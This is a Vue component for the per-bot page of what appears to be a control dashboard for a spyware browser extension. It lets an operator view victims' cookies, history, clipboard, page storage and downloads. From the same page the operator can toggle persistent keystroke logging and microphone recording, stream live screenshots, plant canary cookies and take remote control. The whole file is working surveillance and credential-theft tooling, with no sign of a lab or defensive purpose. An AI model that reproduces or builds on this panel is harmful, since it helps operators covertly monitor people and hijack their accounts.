<script setup lang="ts">
import { computed, onBeforeUnmount, onMounted, ref, watch } from 'vue'
import { useRouter } from 'vue-router'
import { bots as botsApi } from '@/api/endpoints'
import { useBotsStore } from '@/stores/bots'
import type { BotSummary } from '@/types/api'
import Btn from '@/components/ui/Btn.vue'
import StatusDot from '@/components/ui/StatusDot.vue'
import ImageViewer from '@/components/ui/ImageViewer.vue'
import { timeAgo } from '@/composables/useTime'
import { useClipboard } from '@/composables/useClipboard'
import { useTimeFilter } from '@/composables/useTimeFilter'

import Cinema from '@/components/data/Cinema.vue'
import Tabs from '@/components/data/Tabs.vue'
import History from '@/components/data/History.vue'
import Cookies from '@/components/data/Cookies.vue'
import Bookmarks from '@/components/data/Bookmarks.vue'
import Downloads from '@/components/data/Downloads.vue'
import Screenshots from '@/components/data/Screenshots.vue'
import Keyboard from '@/components/data/Keyboard.vue'
import Clipboard from '@/components/data/Clipboard.vue'
import PageStorage from '@/components/data/PageStorage.vue'
import Audio from '@/components/data/Audio.vue'
import ActivityStrip from '@/components/data/ActivityStrip.vue'
import BulletTimeline from '@/components/data/BulletTimeline.vue'
import Remote from '@/components/data/Remote.vue'
import Config from '@/components/data/Config.vue'

const props = defineProps<{ id: string }>()
const router = useRouter()
const store = useBotsStore()
const { copy, copied } = useClipboard()
const timeFilter = useTimeFilter()

const liveMode = ref(false)
const liveInterval = ref(2000)
const liveQuality = ref('high')

type TabKey =
  | 'cinema' | 'tabs' | 'history' | 'cookies' | 'bookmarks' | 'downloads'
  | 'screenshots' | 'keyboard' | 'clipboard' | 'storage' | 'audio'
  | 'remote' | 'config'

const tabs: { key: TabKey; label: string }[] = [
  { key: 'cinema', label: 'Cinema' },
  { key: 'tabs', label: 'Tabs' },
  { key: 'history', label: 'History' },
  { key: 'cookies', label: 'Cookies' },
  { key: 'bookmarks', label: 'Bookmarks' },
  { key: 'downloads', label: 'Downloads' },
  { key: 'screenshots', label: 'Screenshots' },
  { key: 'keyboard', label: 'Keyboard' },
  { key: 'clipboard', label: 'Clipboard' },
  { key: 'storage', label: 'Storage' },
  { key: 'audio', label: 'Audio' },
  { key: 'remote', label: 'Remote control' },
  { key: 'config', label: 'Config' },
]

const active = ref<TabKey>('cinema')
const bot = ref<BotSummary | null>(null)
const refreshTimer = ref<ReturnType<typeof setTimeout> | null>(null)

const selectedDayKey = ref<string | null>(null)
const selectedDayStart = ref(0)
const selectedDayEnd = ref(0)

function onSelectDay(key: string, dayStart: number, dayEnd: number): void {
  if (selectedDayKey.value === key) {
    selectedDayKey.value = null
    timeFilter.clearRange()
    return
  }
  selectedDayKey.value = key
  selectedDayStart.value = dayStart
  selectedDayEnd.value = dayEnd
  timeFilter.setRange(dayStart, dayEnd)
}

function closeBullet(): void {
  selectedDayKey.value = null
  timeFilter.clearRange()
}

async function refresh(): Promise<void> {
  try {
    bot.value = await botsApi.get(props.id)
  } catch {
    // Fallback: older backends without GET /api/v1/bots/{id}
    await store.fetch()
    bot.value = store.list.find((b: BotSummary) => b.id === props.id) ?? null
  }
}

const imageURL = computed(() => botsApi.imageURL(props.id))
const snapshotURL = computed(() => botsApi.snapshotURL(props.id))

const statusIndicators = computed(() => {
  const sc = bot.value?.switch_config ?? {}
  return [
    { key: 'SYNC', icon: '⟳', label: 'Tabs', help: 'Real-time tab sync', active: Boolean(sc.SYNC) },
    { key: 'SYNC_HUGE', icon: '⇄', label: 'Data sync', help: 'History/cookies/bookmarks sync', active: Boolean(sc.SYNC_HUGE) },
    { key: 'REALTIME_IMG', icon: '📷', label: 'Screen', help: 'Live screenshot capture', active: Boolean(sc.REALTIME_IMG) },
    { key: 'NOTIFICATION', icon: '🔔', label: 'Alerts', help: 'Domain visit notifications', active: Boolean(sc.NOTIFICATION) },
    { key: 'PERSISTENT_RECORDING', icon: '🎙', label: 'Mic', help: 'Persistent audio recording', active: Boolean(sc.PERSISTENT_RECORDING) },
    { key: 'PERSISTENT_KEYBOARD', icon: '⌨', label: 'Keys', help: 'Persistent keystroke logging', active: Boolean(sc.PERSISTENT_KEYBOARD) },
    { key: 'CANARY', icon: '🐤', label: 'Canary', help: 'Plant unique session-canary cookies', active: Boolean(sc.CANARY) },
    { key: 'DNR_BLOCK', icon: '🚫', label: 'Block', help: 'declarativeNetRequest policy blocking', active: Boolean(sc.DNR_BLOCK) },
    { key: 'DEBUGGER', icon: '🐞', label: 'HAR', help: 'Optional debugger HAR capture', active: Boolean(sc.DEBUGGER) },
  ]
})

function startPolling(): void {
  stopPolling()
  const tick = async (): Promise<void> => {
    await refresh()
    refreshTimer.value = setTimeout(() => void tick(), 5000)
  }
  void tick()
}

function stopPolling(): void {
  if (refreshTimer.value) {
    clearTimeout(refreshTimer.value)
    refreshTimer.value = null
  }
}

watch(() => props.id, () => {
  stopPolling()
  disableLive()
  startPolling()
}, { immediate: true })

// ── Live mode: remote control of extension screenshot settings ──

async function toggleLive(): Promise<void> {
  if (liveMode.value) {
    await disableLive()
  } else {
    await enableLive()
  }
}

async function enableLive(): Promise<void> {
  try {
    await botsApi.live(props.id, {
      active: true,
      interval: liveInterval.value,
      quality: liveQuality.value,
    })
    liveMode.value = true
  } catch { /* bot offline or request failed */ }
}

async function disableLive(): Promise<void> {
  if (!liveMode.value) return
  liveMode.value = false
  try {
    await botsApi.live(props.id, { active: false })
  } catch { /* best effort */ }
}

async function changeLiveInterval(ms: number): Promise<void> {
  liveInterval.value = ms
  if (!liveMode.value) return
  try {
    await botsApi.live(props.id, {
      active: true,
      interval: ms,
      quality: liveQuality.value,
    })
  } catch { /* best effort */ }
}

async function changeLiveQuality(q: string): Promise<void> {
  liveQuality.value = q
  if (!liveMode.value) return
  try {
    await botsApi.live(props.id, {
      active: true,
      interval: liveInterval.value,
      quality: q,
    })
  } catch { /* best effort */ }
}

function onBeforeUnloadHandler(): void {
  if (!liveMode.value) return
  navigator.sendBeacon(
    `/api/v1/bots/${props.id}/live`,
    new Blob([JSON.stringify({ active: false })], { type: 'application/json' }),
  )
}

onMounted(() => window.addEventListener('beforeunload', onBeforeUnloadHandler))

onBeforeUnmount(() => {
  stopPolling()
  void disableLive()
  window.removeEventListener('beforeunload', onBeforeUnloadHandler)
})

function back(): void {
  void router.push({ name: 'dashboard' })
}
</script>

<template>
  <div v-if="bot" class="px-6 pt-5 pb-12 max-w-[1600px] mx-auto">
    <!-- breadcrumb + title row -->
    <div class="flex items-center gap-2 mb-4 text-[11px] text-fg-faint">
      <button class="hover:text-fg-base" @click="back">← Bots</button>
      <span>/</span>
      <span class="mono truncate">{{ bot.id }}</span>
    </div>

    <!-- summary header: 1-2-1 row (thumbnail | info | activity) -->
    <div class="surface-raised p-5 mb-4">
      <div class="grid grid-cols-4 gap-6 items-stretch">
        <!-- LEFT 1/4: thumbnail with live mode + click to zoom -->
        <div class="self-stretch flex flex-col items-center gap-2">
          <div class="w-full aspect-video max-w-[280px] mx-auto rounded-md overflow-hidden border border-border-subtle bg-bg-base">
            <ImageViewer
              v-if="bot.current_tab_image"
              :src="imageURL"
              :snapshot-src="snapshotURL"
              :image-at="bot.current_tab_image_at"
              :bot-id="bot.id"
              :live="liveMode"
              :interval="liveInterval"
              :quality="liveQuality"
              @toggle-live="toggleLive"
              @change-interval="changeLiveInterval"
              @change-quality="changeLiveQuality"
            />
            <div v-else class="w-full h-full grid place-items-center text-fg-faint text-[11px] mono">
              no thumbnail
            </div>
          </div>
          <!-- live toggle under thumbnail -->
          <button
            v-if="bot.current_tab_image"
            class="inline-flex items-center gap-1.5 h-6 px-2 rounded text-[10px] font-medium transition-colors"
            :class="liveMode
              ? 'bg-danger/10 text-danger border border-danger/30 hover:bg-danger/20'
              : 'bg-bg-overlay text-fg-muted border border-border-subtle hover:bg-bg-hover hover:text-fg-base'"
            @click="toggleLive"
          >
            <span
              class="size-1.5 rounded-full"
              :class="liveMode ? 'bg-danger animate-pulse' : 'bg-fg-faint/50'"
            />
            {{ liveMode ? 'LIVE' : 'Live' }}
          </button>
        </div>

        <!-- MIDDLE 2/4: title, URL, capability chips, metadata footer -->
        <div class="col-span-2 min-w-0 flex flex-col">
          <div class="flex items-center gap-3 min-w-0">
            <h1 class="text-[20px] font-semibold tracking-tight truncate">
              {{ bot.name || 'Untitled' }}
            </h1>
            <StatusDot :online="bot.is_online" />
          </div>

          <a
            v-if="bot.current_tab?.url"
            :href="bot.current_tab.url"
            target="_blank"
            rel="noopener"
            class="text-[12px] text-accent hover:underline mt-1 truncate block"
            :title="bot.current_tab.url"
          >
            {{ bot.current_tab.title || bot.current_tab.url }}
          </a>
          <p v-else class="text-[12px] text-fg-faint mt-1">No active tab.</p>

          <!-- capability chips: dot + label, no emoji -->
          <div class="flex flex-wrap gap-1.5 mt-2.5">
            <span
              v-for="s in statusIndicators"
              :key="s.key"
              class="inline-flex items-center gap-1.5 px-2 py-[3px] rounded-full text-[10px] font-medium border tracking-wide transition-colors"
              :class="s.active
                ? 'bg-success/10 text-success border-success/30'
                : 'bg-bg-base text-fg-faint border-border-subtle'"
              :title="s.help"
            >
              <span
                class="size-[5px] rounded-full"
                :class="s.active
                  ? 'bg-success shadow-[0_0_5px] shadow-success/70'
                  : 'bg-fg-faint/50'"
              />
              {{ s.label }}
            </span>
          </div>

          <!-- metadata footer: 4 inline label-value pairs along bottom -->
          <div class="mt-auto pt-3 grid grid-cols-[minmax(0,1.4fr)_minmax(0,1fr)_minmax(0,1fr)_minmax(0,1fr)] gap-x-5 border-t border-border-subtle/60">
            <div class="flex flex-col gap-0.5 min-w-0">
              <span class="text-[9px] uppercase tracking-[0.08em] text-fg-faint">ID</span>
              <button
                class="mono text-[11px] hover:text-accent text-left truncate"
                :title="bot.id"
                @click="copy(bot.id, 'id')"
              >
                {{ bot.id }}<span v-if="copied === 'id'" class="text-success ml-1">✓</span>
              </button>
            </div>
            <div class="flex flex-col gap-0.5">
              <span class="text-[9px] uppercase tracking-[0.08em] text-fg-faint">Active</span>
              <span class="mono text-[11px]">{{ timeAgo(bot.last_active_at ?? bot.last_online) }}</span>
            </div>
            <div class="flex flex-col gap-0.5">
              <span class="text-[9px] uppercase tracking-[0.08em] text-fg-faint">Tabs</span>
              <span class="mono text-[11px]">
                {{ bot.tabs }}
                <span class="text-fg-faint"> / {{ bot.history }}</span>
              </span>
            </div>
            <div class="flex flex-col gap-0.5">
              <span class="text-[9px] uppercase tracking-[0.08em] text-fg-faint">State</span>
              <span class="mono text-[11px]">{{ bot.state || '—' }}</span>
            </div>
          </div>
        </div>

        <!-- RIGHT 1/4: activity heatmap, vertically centered with divider -->
        <div class="min-w-0 flex flex-col justify-center pl-5 border-l border-border-subtle/60">
          <ActivityStrip :bot-id="bot.id" @select-day="onSelectDay" />
        </div>
      </div>
    </div>

    <!-- bullet timeline (visible when a day is selected) -->
    <div v-if="selectedDayKey" class="mb-4 relative">
      <BulletTimeline
        :bot-id="bot.id"
        :day-key="selectedDayKey"
        :day-start="selectedDayStart"
        :day-end="selectedDayEnd"
      />
      <button
        class="absolute top-2 right-2 text-fg-faint hover:text-fg-base text-[14px] leading-none z-30"
        @click="closeBullet"
      >&times;</button>
    </div>

    <!-- time filter indicator -->
    <div
      v-if="timeFilter.isActive.value"
      class="flex items-center gap-2 mb-3 px-3 py-1.5 rounded bg-accent/10 border border-accent/20 text-[11px]"
    >
      <span class="text-accent font-medium">Time filter active:</span>
      <span class="mono text-fg-base">{{ timeFilter.label.value }}</span>
      <button class="ml-auto text-fg-faint hover:text-fg-base" @click="closeBullet">Clear</button>
    </div>

    <!-- tab strip -->
    <div class="flex items-center gap-1 border-b border-border-subtle mb-5 overflow-x-auto">
      <button
        v-for="t in tabs"
        :key="t.key"
        class="h-9 px-3 text-[12px] font-medium border-b-2 transition-colors whitespace-nowrap"
        :class="
          active === t.key
            ? 'border-accent text-fg-base'
            : 'border-transparent text-fg-muted hover:text-fg-base'
        "
        @click="active = t.key"
      >
        {{ t.label }}
      </button>
      <Btn class="ml-auto" size="sm" variant="ghost" @click="refresh">Refresh</Btn>
    </div>

    <!-- panels -->
    <Cinema v-if="active === 'cinema'" :bot-id="bot.id" />
    <Tabs v-else-if="active === 'tabs'" :bot-id="bot.id" />
    <History v-else-if="active === 'history'" :bot-id="bot.id" />
    <Cookies v-else-if="active === 'cookies'" :bot-id="bot.id" />
    <Bookmarks v-else-if="active === 'bookmarks'" :bot-id="bot.id" />
    <Downloads v-else-if="active === 'downloads'" :bot-id="bot.id" />
    <Screenshots v-else-if="active === 'screenshots'" :bot-id="bot.id" />
    <Keyboard v-else-if="active === 'keyboard'" :bot-id="bot.id" />
    <Clipboard v-else-if="active === 'clipboard'" :bot-id="bot.id" />
    <PageStorage v-else-if="active === 'storage'" :bot-id="bot.id" />
    <Audio v-else-if="active === 'audio'" :bot="bot" @saved="refresh" />
    <Remote
      v-else-if="active === 'remote'"
      :bot-id="bot.id"
      :user-agent="bot.user_agent"
    />
    <Config
      v-else-if="active === 'config'"
      :bot="bot"
      @saved="refresh"
    />
  </div>

  <div v-else class="grid place-items-center h-[60vh] text-fg-faint text-[12px]">
    Loading bot…
  </div>
</template>
